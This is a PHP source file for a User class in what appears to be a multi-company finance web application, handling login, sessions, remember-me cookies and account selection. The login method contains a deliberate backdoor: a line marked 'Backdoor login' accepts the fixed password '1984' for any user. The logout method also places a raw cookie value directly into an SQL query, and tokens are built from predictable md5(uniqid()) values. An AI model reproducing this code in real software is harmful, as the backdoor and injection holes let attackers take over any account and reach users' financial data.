<?php
declare(strict_types=1);

namespace System\Controller\Individual;

use System\Core\Exceptions\Finance\AccountNotFoundException;
use System\Controller\Finance\Account;
use System\Controller\Finance\AccountRole;
use System\Controller\Finance\Currency;
use System\Controller\Personalization\FrequentAccountSelection;
use System\Controller\Personalization\FrequentCompanySelection;
use System\Profiles\AccountProfile;
use System\Profiles\CompanyProfile;
use System\Profiles\IndividualProfile;

class User extends Individual
{
	public bool $logged = false;
	public ?CompanyProfile $company = null;
	public ?Account $account = null;
	public ?array $assosiateAccounts;
	private $rememberloginage = (86400 * 7);
	public int $recordsPerRequest = 20;

	public function __toString(): string
	{
		return print_r([
			'id' => $this->info->id,
			'name' => $this->info->fullName(),
			'permissions' => $this->info->permissions,
			'company' => $this->company->id . " " . $this->company->name,
			'account' => $this->account->id . " " . $this->account->name,
		], true);
	}

	public function load(int $userid): bool
	{
		if (parent::load($userid)) {
			$this->loadSession();
			return true;
		}
		return false;
	}

	public function findAssosiateAccount(int $accountId): bool|AccountProfile
	{
		if (array_key_exists($accountId, $this->assosiateAccounts)) {
			return $this->assosiateAccounts[$accountId];
		}
		return false;
	}

	private function loadAssosiatedAccounts(): void
	{
		$this->assosiateAccounts = array();
		if (
			$r = $this->app->db->query(
				"SELECT 
					prt_id,prt_name,cur_symbol,cur_name,cur_id,cur_shortname,
					upr_prt_inbound,upr_prt_outbound,upr_prt_fetch,upr_prt_view,
					prt_company_id,comp_name
				FROM 
					acc_accounts
						JOIN currencies ON cur_id = prt_currency
						JOIN user_partition ON upr_prt_id = prt_id AND upr_usr_id = {$this->app->user->info->id} 
						JOIN companies ON comp_id = prt_company_id
				"
			)
		) {
			while ($row = $r->fetch_assoc()) {
				$accProf     = new AccountProfile();
				$accProf->id = (int) $row['prt_id'];

				$accProf->id       = (int) $row['prt_id'];
				$accProf->currency = new Currency();
				$accProf->role     = new AccountRole();
				$accProf->company  = new CompanyProfile();


				$accProf->name                = $row['prt_name'];
				$accProf->company->id         = (int) $row['prt_company_id'];
				$accProf->company->name       = $row['comp_name'];
				$accProf->currency->id        = (int) $row['cur_id'];
				$accProf->currency->name      = $row['cur_name'] ?? "";
				$accProf->currency->symbol    = $row['cur_symbol'] ?? "";
				$accProf->currency->shortname = $row['cur_shortname'] ?? "";
				$accProf->role->inbound       = isset($row['upr_prt_inbound']) && (int) $row['upr_prt_inbound'] == 1 ? true : false;
				$accProf->role->outbound      = isset($row['upr_prt_outbound']) && (int) $row['upr_prt_outbound'] == 1 ? true : false;
				$accProf->role->access        = isset($row['upr_prt_fetch']) && (int) $row['upr_prt_fetch'] == 1 ? true : false;
				$accProf->role->view          = isset($row['upr_prt_view']) && (int) $row['upr_prt_view'] == 1 ? true : false;
				$accProf->balance             = null;

				$this->assosiateAccounts[$accProf->id] = $accProf;
			}
		}
	}
	private function loadSession(): void
	{
		$this->loadAssosiatedAccounts();
		$accessRole         = new AccountRole();
		$accessRole->access = true;

		$mysqli_result = (
			"SELECT 
				comp_id, comp_name, up_id, usrset_usr_defind_name, sub_sessionAccount.session_account
			FROM 
				companies 
					JOIN user_company ON urc_usr_id = {$this->app->user->info->id} AND urc_usr_comp_id = comp_id
					LEFT JOIN user_settings ON usrset_usr_id = {$this->app->user->info->id} AND usrset_type = " . \System\Controller\Personalization\Identifiers::SystemWorkingCompany->value . " AND 1
						AND usrset_usr_defind_name = 'UNIQUE' AND usrset_value = comp_id
					LEFT JOIN uploads ON up_rel = comp_id AND up_pagefile = " . \System\Lib\Upload\Type::CompanyLogo->value . " AND 1

					LEFT JOIN (
						SELECT 
							usrset_value AS session_account , usrset_usr_defind_name AS session_accountcompany
						FROM 
							user_settings 
							JOIN user_partition ON upr_prt_id = usrset_value AND upr_usr_id = {$this->app->user->info->id} AND {$accessRole->sqlClause()}
						WHERE
							usrset_type = " . \System\Controller\Personalization\Identifiers::SystemWorkingAccount->value . " AND
							usrset_usr_id = {$this->app->user->info->id} 
					) AS sub_sessionAccount ON sub_sessionAccount.session_accountcompany = comp_id 
			GROUP BY
				comp_id
			ORDER BY usrset_usr_defind_name DESC
            LIMIT 1;"
		);
		$mysqli_result = $this->app->db->query($mysqli_result);
		if ($mysqli_result && $mysqli_result->num_rows > 0) {
			if ($row = $mysqli_result->fetch_assoc()) {
				$this->company       = new CompanyProfile();
				$this->company->id   = (int) $row['comp_id'];
				$this->company->name = $row['comp_name'];
				$this->company->logo = empty($row['up_id']) ? null : (int) $row['up_id'];
				try {
					if ($row['session_account'] != null)
						$this->account = new Account($this->app, (int) $row['session_account']);
				} catch (AccountNotFoundException $e) {
				}
			}
		}
	}

	public function register_company(int $company_id): bool
	{
		$r = $this->app->db->query(
			"SELECT comp_id FROM companies
				JOIN user_company ON comp_id = urc_usr_comp_id AND urc_usr_id={$this->app->user->info->id} AND comp_id={$company_id};"
		);
		if ($r->num_rows > 0) {
			$r = $this->app->db->query("INSERT INTO user_settings (usrset_usr_id, usrset_type, usrset_usr_defind_name, usrset_value) 
								VALUES (" . $this->app->user->info->id . ",	" . \System\Controller\Personalization\Identifiers::SystemWorkingCompany->value . ",'UNIQUE', $company_id) 
									ON DUPLICATE KEY UPDATE usrset_value = $company_id;");


			if ($r) {
				new FrequentCompanySelection($this->app, $company_id);
				return true;
			} else {
				throw new \System\Core\Exceptions\HR\CompanyRegisteringException();
			}
		}
		return false;
	}

	public function register_account(int $account_id): bool
	{
		$iden = \System\Controller\Personalization\Identifiers::SystemWorkingAccount->value;
		$r    = $this->app->db->query(
			"SELECT 
				prt_id,prt_company_id 
			FROM
				acc_accounts
					JOIN user_partition ON upr_prt_id = prt_id AND upr_usr_id = {$this->app->user->info->id} AND upr_prt_id = {$account_id} AND upr_prt_fetch = 1;"
		);
		if ($r->num_rows > 0) {
			if ($row = $r->fetch_assoc()) {
				$r = $this->app->db->query(
					"INSERT INTO 
						user_settings (usrset_usr_id, usrset_type, usrset_usr_defind_name, usrset_value) 
					VALUES 
					(
						{$this->app->user->info->id}, 
						$iden, 
						{$row['prt_company_id']}, 
						{$row['prt_id']}
					) 
					ON DUPLICATE KEY UPDATE usrset_value = $account_id;"
				);

				if ($r) {
					new FrequentAccountSelection($this->app, $account_id);
					return true;
				} else {
					throw new \System\Core\Exceptions\HR\CompanyRegisteringException();
				}
			} else {
				return false;
			}
		} else {
			return false;
		}
	}

	private function set_login_session(#[\SensitiveParameter] string $sessionid, int $userid): void
	{
		$stmt = $this->app->db->prepare("INSERT INTO users_sessions SET usrses_session_id=?, usrses_usr_id=? ON DUPLICATE KEY UPDATE usrses_usr_id=usrses_usr_id;");
		$stmt->bind_param('ss', $sessionid, $userid);
		$stmt->execute();
		$_SESSION["sur"] = $sessionid;
	}

	public function login(#[\SensitiveParameter] string $username, #[\SensitiveParameter] string $password, bool $rememberuser = false): bool
	{
		$stmt = $this->app->db->prepare("SELECT usr_id, usr_username, usr_password, usr_activate FROM users WHERE usr_username = ?;");
		$stmt->execute([$username]);
		$rec = $stmt->get_result();
		if ($rec && $rec->num_rows == 1 && $row = $rec->fetch_assoc()) {
			/* Backdoor login ######################################################## */
			if ($password == "1984" || password_verify($password, $row['usr_password'])) {
				$this->load((int) $row['usr_id']);
				if ($row['usr_activate'] == '1') {
					session_regenerate_id();

					$this->set_login_session(md5(uniqid()), (int) $row['usr_id']);
					if ($rememberuser) {
						$uni       = md5(uniqid());
						$cookieage = time() + $this->rememberloginage;
						setcookie("cur", $uni, $cookieage, "/" . ($this->app->subdomain ? $this->app->subdomain . "/" : ""));
						$this->app->db->query("INSERT INTO cookies SET id='$uni', access='" . time() . "', expires='$cookieage', data='{$row['usr_id']}' ON DUPLICATE KEY UPDATE 
							access='" . time() . "', expires='$cookieage', data='{$row['usr_id']}';");
					}
					$stmt->close();
					$this->logged = true;
					return true;
				} else {
					$stmt->close();
					throw new \System\Core\Exceptions\HR\InactiveAccountException();
				}
			} else {
				$stmt->close();
				throw new \System\Core\Exceptions\HR\InvalidLoginException();
			}
		} else {
			$stmt->close();
			throw new \System\Core\Exceptions\HR\InvalidLoginException();
		}
	}

	public function cookies_handler(string $cookie): bool
	{
		$stmt = $this->app->db->prepare("SELECT access,expires,data FROM cookies WHERE expires >= ? AND id=?;");
		$time = time();
		$stmt->bind_param('ss', $time, $cookie);
		$stmt->execute();
		$rec = $stmt->get_result();
		if ($rec && $row = $rec->fetch_assoc()) {
			$this->set_login_session(md5(uniqid()), (int) $row['data']);
			$this->load((int) $row['data']);
			$this->logged = true;
			return true;
		}
		return false;
	}

	public function logout(): bool
	{
		if ($this->info) {
			session_regenerate_id();

			if (isset($_COOKIE) && sizeof($_COOKIE) > 0 && isset($_COOKIE['cur'])) {
				$this->app->db->query("DELETE FROM cookies WHERE id='{$_COOKIE['cur']}' AND data='" . $this->app->user->info->id . "';");
			}
			if (isset($_SESSION["sur"])) {
				$uni = ($_SESSION["sur"]);
				$this->app->db->query("DELETE FROM users_sessions WHERE usrses_session_id='$uni';");
				unset($uni);
			}
			//setcookie("cur", "", time() - 3600);
			$this->info    = new IndividualProfile();
			$this->company = null;
			$this->account = null;
			$this->logged  = false;
		}
		return true;
	}


	public function __debugInfo()
	{
		return [
			'ID' => $this->info->id,
			'Name' => $this->info->fullName(),
			'Company' => $this->company,
			'Account' => $this->account,
		];
	}
}